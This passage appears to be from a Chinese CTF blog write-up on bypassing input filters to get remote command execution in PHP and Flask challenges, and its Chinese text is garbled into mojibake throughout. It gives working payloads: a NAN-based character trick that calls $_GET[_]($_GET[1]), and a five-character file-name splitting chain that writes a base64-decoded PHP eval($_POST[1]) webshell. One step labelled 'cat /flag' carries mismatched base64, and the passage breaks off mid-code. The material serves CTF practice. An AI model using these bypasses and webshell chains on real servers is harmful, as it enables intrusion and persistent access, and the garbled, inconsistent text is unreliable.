href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h3><p>ä¸¤ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.åˆ©ç”¨phpæ•°å€¼æº¢å‡ºæ„é€ å­—æ¯&#x27;N&#x27;</span><br><span class="line">2.passthruå‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">107</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç®€å•åˆ†æä¸€ä¸‹</p><p>å­—æ¯å‰©ä¸‹äº†<code>C</code>,æ•°å­—å‰©ä¸‹äº†<code>0-3</code>ï¼ŒåŒæ ·æ˜¯åˆ©ç”¨è‡ªå¢è‡ªå‡</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)[0];$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$$_[_]($$_[1]);</span><br></pre></td></tr></table></figure><p>å› ä¸ºå­˜åœ¨é•¿åº¦é™åˆ¶<code>strlen($ctfshow) &lt;= 107</code>ï¼Œæ‰€ä»¥æƒ³åˆ©ç”¨è‡ªå¢è‡ªå‡ä¸€ç»™ä¸€ä¸ªæ‹¼æ¥å­—æ¯æ˜¯ä¸ç°å®çš„ï¼Œéœ€è¦åˆ©ç”¨<code>C</code>æ„é€ å­—æ¯è¡¨åé¢çš„å­—æ¯</p><p>åˆ©ç”¨phpä¸­ä¸€äº›æ•°å­¦ä¸Šçš„trick</p><p>åœ¨phpä¸­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.PHPè®¤ä¸ºç»“æœæ˜¯æ— é™å¤§æ—¶ï¼Œè¾“å‡ºï¼šINFï¼ˆInfiniteï¼‰ </span><br><span class="line">2.å½“ä¸€ä¸ªæ•°è¶…å‡ºInfiniteï¼Œè¾“å‡º: double(NAN)       //NAN =&gt; not a number</span><br></pre></td></tr></table></figure><p>è€Œä¸¤ä¸ªå­—æ¯ç›¸é™¤éƒ½ä¼šè¢«è®¤ä¸ºæ˜¯<code>NAN</code>ï¼Œå…¶ä¸­è¿˜åŒ…æ‹¬<code>0/0=NAN</code></p><p>å› ä¸ºè¿”å›çš„NANæ˜¯doubleç±»å‹ï¼Œæƒ³è·å¾—å•ä¸ªå­—ç¬¦éœ€è¦æ‹¼æ¥ä¸€ä¸ªå­—ç¬¦ä¸Šå»ï¼Œä¸ç„¶è¿”å›çš„æ˜¯NULL</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=(C/C)[<span class="number">0</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//output:NULL</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=(C/C.C)[<span class="number">0</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//output:string(1) &quot;N&quot;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ‹¿åˆ°äº†<code>N</code>,å‰©ä¸‹çš„å°±æ­£å¸¸æ„é€ å°±è¡Œäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=C;  <span class="comment">//C</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$C</span>=++<span class="variable">$_</span>;  <span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$C_</span>=++<span class="variable">$_</span>;  <span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>=(C/C.C)[<span class="number">0</span>];  <span class="comment">//N</span></span><br><span class="line"><span class="variable">$_</span>++; </span><br><span class="line"><span class="variable">$_</span>++;  </span><br><span class="line"><span class="variable">$_</span>++;  </span><br><span class="line"><span class="variable">$_</span>++;  </span><br><span class="line"><span class="variable">$_</span>++;  </span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$C_</span>.<span class="variable">$C</span>.++<span class="variable">$_</span>;  <span class="comment">//$_GET</span></span><br><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[<span class="number">1</span>]);  <span class="comment">//$_GET[_]($_GET[1])</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†systemï¼Œç”¨<code>passthru</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210071206732.png" alt="image-20221007120622652"></p><h1 id="æœ‰é™å­—ç¬¦ä¸‹çš„RCE"><a href="#æœ‰é™å­—ç¬¦ä¸‹çš„RCE" class="headerlink" title="æœ‰é™å­—ç¬¦ä¸‹çš„RCE"></a>æœ‰é™å­—ç¬¦ä¸‹çš„RCE</h1><p>åœ¨ç½‘é¼æ—¶é‡åˆ°ä¸€ä¸ªå››å­—ç¬¦rceçš„é¢˜ç›®ï¼Œå½“æ—¶æ²¡åšå‡ºæ¥ï¼Œæ•…åœ¨èµ›åå¤ç°æ—¶å†™ä¸‹æ€»ç»“ã€‚</p><h2 id="Linuxå‘½ä»¤æµ…æ"><a href="#Linuxå‘½ä»¤æµ…æ" class="headerlink" title="Linuxå‘½ä»¤æµ…æ"></a>Linuxå‘½ä»¤æµ…æ</h2><p><strong>é‡å®šå‘ç¬¦(&gt;&#x2F;&gt;&gt;)</strong></p><p><code>linux</code>ä¸­ï¼Œé‡å®šå‘ç¬¦<code>&gt;/&gt;&gt;</code>å…·æœ‰åˆ›å»ºæ–‡ä»¶çš„åŠŸèƒ½ï¼Œä¸”åœ¨å…¶å‰é¢å¯æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œç„¶åå°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœå†™å…¥åˆ°æŒ‡å®šæ–‡ä»¶ä¸­</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254744.png" alt="image-20221008225412701"></p><p>å…¶ä¸­<code>&gt;</code>å‘½ä»¤ä¼šå°†åŸæœ‰æ–‡ä»¶å†…å®¹è¦†ç›–,<code>&gt;&gt;</code>ä¼šå°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸæœ‰çš„å†…å®¹</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031778.png" alt="image-20220831115455419"></p><p><strong>shæ‰§è¡Œå‘½ä»¤</strong></p><p><code>linux</code>ä¸­<code>sh</code>å‘½ä»¤ä¼šå°†æ–‡ä»¶ä¸­çš„å†…å®¹å½“ä½œå‘½ä»¤æ¥æ‰§è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254293.png" alt="image-20221008225424251"></p><p><strong>ls [é€‰é¡¹] [ç›®å½•å]</strong></p><p><code>linux</code>ä¸­<code>ls</code>é»˜è®¤æŒ‰ç…§å­—æ¯é¡ºåºæ’åºï¼Œ<code>-t</code>å‚æ•°ä»¥æ–‡ä»¶ä¿®æ”¹æ—¶é—´æ’åºï¼Œæ–°åˆ›å»ºçš„æ–‡ä»¶åœ¨å‰é¢ï¼Œ<code>-h</code>å‚æ•°ä»¥æ˜“è¯»çš„æ–¹å¼æ˜¾ç¤ºæ–‡ä»¶æˆ–ç›®å½•å¤§å°ï¼Œå¦‚ 1KBã€234MBã€2GB ç­‰ã€‚<code>-h</code>å‚æ•°ä¸»è¦çš„ä½œç”¨æ˜¯è°ƒæ•´<code>-t</code>å‚æ•°ä½ç½®ï¼Œä¸‹æ–‡ä»¥å…·ä½“ä¾‹å­è¿›è¡Œåˆ†æ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254083.png" alt="image-20221008225431045"></p><p><strong>æ˜Ÿå·(*)</strong></p><p><code>linux</code>ä¸­<code>*</code>å¯ä½œä¸ºé€šé…ç¬¦ä½¿ç”¨ï¼Œåœ¨è¾“å…¥<code>*</code>åï¼Œ<code>linux</code>ä¼šå°†è¯¥ç›®å½•ä¸‹ç¬¬ä¸€ä¸ªæ–‡ä»¶åä½œä¸ºå‘½ä»¤ï¼Œå‰©ä¸‹çš„çš„æ–‡ä»¶åå½“ä½œå‚æ•°</p><p>å¦‚ä¸‹ä¾‹å­æ‰§è¡Œ<code>*</code>å³æ˜¯ç›¸å½“äºæ‰§è¡Œäº†<code>ls -t</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031785.png" alt="image-20220831121538955"></p><p><strong>åæ–œæ <code>\</code>å®ç°å‘½ä»¤æ¢è¡Œ</strong></p><p><code>linux</code>ä¸­ï¼Œæ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå¯ä»¥åœ¨æ²¡æœ‰å†™å®Œçš„å‘½ä»¤åé¢åŠ <code>\</code>ï¼Œå®ç°å°†ä¸€æ¡å‘½ä»¤å¤šè¡ŒåŒ–ï¼Œä»¥è¡Œæœ«æ²¡æœ‰<code>\</code>ä¸ºç»ˆæ­¢</p><p>å¦‚ä¸‹ç›¸å½“äºæ‰§è¡Œäº†<code>cat flag.txt</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254616.png" alt="image-20221008225446574"></p><p><strong>rev</strong></p><p><code>linux</code>ä¸­,åˆ©ç”¨<code>rev</code>å¯å°†æ–‡ä»¶å†…å®¹å€’ç½®ï¼ŒåŒæ—¶å¯ä»¥é…åˆ<code>&gt;</code>,<code>*</code>ä½¿ç”¨</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082254944.png" alt="image-20221008225453900"></p><p><strong>dir</strong></p><p><code>linux</code>ä¸­,<code>dir</code>å‘½ä»¤å’Œlsæ•ˆæœåŸºæœ¬ä¸€æ ·ï¼Œåªæœ‰é…åˆé‡å®šå‘ç¬¦å†™å…¥æ–‡ä»¶æ—¶æœ‰ä¸€äº›å·®åˆ«ï¼Œ<code>ls</code>å†™å…¥æ–‡ä»¶ä¸­æ—¶ï¼Œæ¯ä¸ªæ–‡ä»¶åéƒ½æ˜¯å•ç‹¬ä¸€è¡Œï¼Œå®ƒä¼šè‡ªåŠ¨æ¢è¡Œï¼Œæœ‰æ—¶ä¼šå½±å“åˆ°æˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œï¼Œè€Œ<code>dir</code>ä¼šæŠŠå†…å®¹å…¨éƒ¨å†™å…¥ä¸€è¡Œä¸­ï¼ŒåŒæ—¶ä¼šè‡ªåŠ¨è¡¥å…¨ç©ºæ ¼</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082255621.png" alt="image-20221008225540577"></p><h2 id="äº”å­—ç¬¦"><a href="#äº”å­—ç¬¦" class="headerlink" title="äº”å­—ç¬¦"></a>äº”å­—ç¬¦</h2><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])&lt;=<span class="number">5</span> &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/rm/&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ç®€å•æ€è·¯</strong></p><p>å› ä¸ºshell_execèƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œæ‰€ä»¥å°†éœ€è¦æ‰§è¡Œçš„å‘½ä»¤æ‹†åˆ†ï¼Œä»¥æ–‡ä»¶åçš„å½¢å¼å†™å…¥ï¼Œè¿˜éœ€è¦å†™ä¸€ä¸ªæ–‡ä»¶ç”¨äºå­˜æ”¾<code>ls -th &gt;f</code>ï¼Œç„¶åé€šè¿‡æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œå°†æ–‡ä»¶åå½¢å¼çš„å‘½ä»¤å†™å…¥åˆ°æ–‡ä»¶<code>f</code>ä¸­ï¼Œæœ€åæ‰§è¡Œ<code>f</code>å°±ç›¸å½“äºæ‰§è¡Œäº†å‘½ä»¤</p><p>å‰é¢æˆ‘ä»¬è¯´åˆ°<code>ls -h</code>å‚æ•°çš„ä½¿ç”¨ï¼Œé‚£ä¹ˆ<code>-h</code>ç©¶ç«Ÿæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-hå‚æ•°ä»¥æ˜“è¯»çš„æ–¹å¼æ˜¾ç¤ºæ–‡ä»¶æˆ–ç›®å½•å¤§å°</span><br></pre></td></tr></table></figure><p>ç®€å•çœ‹ä¸ªä¾‹å­ï¼Œç›®æ ‡æ˜¯æ„é€ <code>ls -t &gt; a</code></p><p>é‚£ä¹ˆåº”è¯¥ä¾æ¬¡æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;a\&gt;</span><br><span class="line">&gt;t-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p>å®é™…æ•ˆæœ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031698.png" alt="image-20220831231200664"></p><p>å› ä¸ºlsæ˜¯é»˜è®¤æŒ‰ç…§å­—æ¯é¡ºåºæ¥æ’åºçš„ï¼Œæ‰€ä»¥æ·»ä¸Š-hæ˜¯ä¸ºäº†è®©å‘½ä»¤ä»¥æ­£å¸¸çš„é¡ºåºè¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;a\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082255810.png" alt="image-20221008225554771"></p><p>ç»§ç»­å¾€ä¸‹çœ‹ï¼Œä¸Šé¢è¯´åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lså†™å…¥æ–‡ä»¶ä¸­æ—¶ï¼Œæ¯ä¸ªæ–‡ä»¶åéƒ½æ˜¯å•ç‹¬ä¸€è¡Œï¼Œå®ƒä¼šè‡ªåŠ¨æ¢è¡Œï¼Œæœ‰æ—¶ä¼šå½±å“åˆ°æˆ‘ä»¬çš„å‘½ä»¤æ‰§è¡Œï¼Œè€Œdirä¼šæŠŠå†…å®¹å…¨éƒ¨å†™å…¥ä¸€è¡Œä¸­ï¼ŒåŒæ—¶ä¼šè‡ªåŠ¨è¡¥å…¨ç©ºæ ¼</span><br></pre></td></tr></table></figure><p>å¦‚åŒè¿™æ ·</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082256154.png" alt="image-20221008225601111"></p><p>ç”¨lsçš„è¯å°±ä¼šå½±å“åˆ°å‘½ä»¤çš„æ‰§è¡Œï¼Œæ‰€ä»¥è¿™é‡Œè¦ç”¨diræ¥ä»£æ›¿ls</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v        </span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a        </span><br><span class="line">sh a        æœ€åç”¨shæ¥æ‰§è¡Œå‘½ä»¤</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031797.png" alt="image-20220831231137776"></p><p>æ¥ä¸‹æ¥å°±å¯ä»¥å¼€å§‹æ‹†åˆ†å­—ç¬¦ä¸²äº†ï¼Œç¬¬ä¸€ç§å¯ä»¥ç›´æ¥æ„é€ ä¸€å¥è¯æœ¨é©¬,å› ä¸ºæœ‰<code>&lt;,?</code>ï¼Œéœ€è¦å°†å…¶è¿›è¡Œbase64è½¬æ¢ï¼Œè¿™æ ·payloadé‡Œå°±æ²¡æœ‰ç‰¹æ®Šå­—ç¬¦äº†ï¼Œä»¥phpinfoä½œä¸ºä¾‹å­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();   base64:PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line">æ„é€ </span><br><span class="line">echo PD9waHAgcGhwaW5mbygpOw==|base64 -d&gt;1.php</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯å¿…é¡»è¦å°†å…¶ä¸­ä¸€ä¸ªç©ºæ ¼ç”¨<code>$&#123;IFS&#125;</code>ä»£æ›¿ï¼Œå¦åˆ™ä¼šè¢«â€™åƒâ€™æ‰ä¸€ä¸ªç©ºæ ¼</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031976.png" alt="image-20220831142132429"></p><p>é‚£ä¹ˆpayloadå°±åº”è¯¥è½¬æ¢ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();   base64:PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line">echo$&#123;IFS&#125;PD9waHAgcGhwaW5mbygpOw==|base64 -d&gt;1.php</span><br></pre></td></tr></table></figure><p>æ‹†åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&gt;ec\\</span><br><span class="line">&gt;ho\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;Ag\\</span><br><span class="line">&gt;cG\\</span><br><span class="line">&gt;hw\\</span><br><span class="line">&gt;aW\\</span><br><span class="line">&gt;5m\\</span><br><span class="line">&gt;by\\</span><br><span class="line">&gt;gp\\</span><br><span class="line">&gt;Ow\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;hp</span><br></pre></td></tr></table></figure><p>å› ä¸ºls -tæŒ‰æ—¶é—´å…ˆåé¡ºåºæ’åºï¼Œæ‰€ä»¥éœ€è¦å€’ç½®ï¼ŒåŒæ—¶åŠ ä¸Š<code>ls -ht &gt; a</code>çš„æ„é€  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev </span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;-d\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;\=\\</span><br><span class="line">&gt;Ow\\</span><br><span class="line">&gt;gp\\</span><br><span class="line">&gt;by\\</span><br><span class="line">&gt;5m\\</span><br><span class="line">&gt;aW\\</span><br><span class="line">&gt;hw\\</span><br><span class="line">&gt;cG\\</span><br><span class="line">&gt;Ag\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;9w\\</span><br><span class="line">&gt;PD\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;ho\\</span><br><span class="line">&gt;ec\\</span><br><span class="line">sh a</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure><p>æˆåŠŸå†™å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082257280.png" alt="image-20221008225715238"></p><p>ç¬¬äºŒç§å¯ä»¥ç›´æ¥æ„é€ <code>cat /flag</code>ï¼Œæ–¹æ³•åŒä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /flag   base64:PD9waHAgcGhwaW5mbygpOw==</span><br><span class="line">æ„é€ </span><br><span class="line">echo PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64 -d&gt;1.php</span><br></pre></td></tr></table></figure><p>æœ€åæ‰§è¡Œ<code>sh 1.php</code>å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210082031577.png" alt="image-20220831233101265"></p><h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><p>ä¸€äº›ä¸çŸ¥é“æ€ä¹ˆåˆ†ç±»çš„rceé¢˜ç›®â€¦</p><h2 id="PYRCE"><a href="#PYRCE" class="headerlink" title="PYRCE"></a>PYRCE</h2><p>æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/ | &#123;&#125; * !;@#\n `~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>):</span><br><span class="line">        nss = request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span 